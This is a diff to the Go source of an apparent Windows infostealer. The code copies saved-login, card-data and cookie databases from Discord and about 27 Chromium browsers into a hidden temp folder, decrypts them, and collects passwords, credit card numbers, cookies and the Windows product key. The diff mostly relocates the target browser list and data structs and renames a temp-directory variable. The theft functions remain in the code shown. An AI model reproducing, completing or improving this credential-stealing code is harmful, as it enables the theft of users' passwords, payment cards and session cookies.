@@ -16,9 +16,7 @@ import (
 	"database/sql"
 	"encoding/base64"
 	"encoding/json"
-	"errors"
 	"fmt"
-	_ "github.com/mattn/go-sqlite3"
 	"golang.org/x/sys/windows/registry"
 	"io"
 	"io/ioutil"
@@ -37,124 +35,7 @@ var (
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 
 	masterKey []byte
-
-	TempFileDir string = TEMP + "\\" + RandStringBytes(16)
-
-	PLATFORMS = [27]PLATFORM{
-		{Chromium: false,
-			DataFiles: ROAMING + "\\discord"},
-		{Chromium: false,
-			DataFiles: ROAMING + "\\discordcanary"},
-		{Chromium: false,
-			DataFiles: ROAMING + "\\discordptb"},
-		{Chromium: true,
-			LocalState: ROAMING + "\\Opera Software\\Opera Stable\\Local State",
-			DataFiles:  ROAMING + "\\Opera Software\\Opera Stable"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: ROAMING + "\\Opera Software\\Opera GX Stable\\Local State",
-			DataFiles:  ROAMING + "\\Opera Software\\Opera GX Stable"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Google\\Chrome\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Google\\Chrome\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Yandex\\YandexBrowser\\User \\Local State",
-			DataFiles:  LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Chromium\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Chromium\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Epic Privacy Browser\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Epic Privacy Browser\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Amigo\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Amigo\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Vivaldi\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Vivaldi\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Orbitum\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Orbitum\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Mail.Ru\\Atom\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Mail.Ru\\Atom\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Kometa\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Kometa\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Comodo\\Dragon\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Comodo\\Dragon\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Torch\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Torch\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Comodo\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Comodo\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Slimjet\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Slimjet\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\360Browser\\Browser\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\360Browser\\Browser\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Maxthon3\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Maxthon3\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\K-Meleon\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\K-Meleon\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Nichrome\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Nichrome\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\CocCoc\\Browser\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\CocCoc\\Browser\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\uCozMedia\\Uran\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\uCozMedia\\Uran\\User Data\\Default"},
-		{Chromium: true,
-			LocalState: LOCAL + "\\Chromodo\\User Data\\Local State",
-			DataFiles:  LOCAL + "\\Chromodo\\User Data\\Default"},
-	}
 )
-
-type DATA_BLOB struct {
-	cbData uint32
-	pbData *byte
-}
-
-type PLATFORM struct {
-	Chromium   bool
-	LocalState string
-	DataFiles  string
-}
-
-type PASSWD struct {
-	Url  string `json:"url"`
-	User string `json:"username"`
-	Pass string `json:"password"`
-}
-
-type CCARD struct {
-	Name       string `json:"name"`
-	Number     string `json:"number"`
-	Expiration string `json:"exp"`
-}
-
-type COOKIE struct {
-	Host  string `json:"url"`
-	Name  string `json:"name"`
-	Value string `json:"value"`
-}
-
-type PRODUCTKEY struct {
-	Value string `json:"value"`
-	Type  string `json:"type"`
-}
 
 func NewBlob(d []byte) *DATA_BLOB {
 	if len(d) == 0 {
@@ -183,8 +64,8 @@ func Decrypt(data []byte) ([]byte, error) {
 }
 
 func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
-	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
-		os.MkdirAll(TempFileDir, 0700)
+	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
+		os.MkdirAll(TEMPFILEDIR, 0700)
 	}
 
 	sourceFile, err := os.Open(pathSourceFile)
@@ -224,15 +105,6 @@ func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
 		return err
 	}
 	return nil
-}
-
-func FileExists(filePath string) bool {
-	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
-	if errors.Is(err, os.ErrNotExist) {
-		return false
-	} else {
-		return true
-	}
 }
 
 func getMasterKey(localStatePath string) ([]byte, error) {
@@ -331,13 +203,13 @@ func GetPasswords() []PASSWD {
 		var TempFileName string = RandStringBytes(8)
 
 		//Copy Login Data file to temp location
-		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TempFileDir+"\\"+TempFileName+".dat")
+		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
 
 		//Open Database
-		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
+		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -421,13 +293,13 @@ func GetCreditCards() []CCARD {
 		var TempFileName string = RandStringBytes(8)
 
 		//Copy Login Data file to temp location
-		err := copyFileToDirectory(Path.DataFiles+"\\Web Data", TempFileDir+"\\"+TempFileName+".dat")
+		err := copyFileToDirectory(Path.DataFiles+"\\Web Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
 
 		//Open Database
-		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
+		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -472,8 +344,8 @@ func GetCreditCards() []CCARD {
 	return output
 }
 
-func GetProductKey() *PRODUCTKEY {
-	output := new(PRODUCTKEY)
+func GetProductKey() *PRODUCT_ID {
+	output := new(PRODUCT_ID)
 
 	sir, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
 	if err != nil {
@@ -525,13 +397,13 @@ func GetCookies() []COOKIE {
 		var TempFileName string = RandStringBytes(8)
 
 		//Copy Login Data file to temp location
-		err := copyFileToDirectory(Path.DataFiles+"\\Network\\Cookies", TempFileDir+"\\"+TempFileName+".dat")
+		err := copyFileToDirectory(Path.DataFiles+"\\Network\\Cookies", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
 
 		//Open Database
-		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
+		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
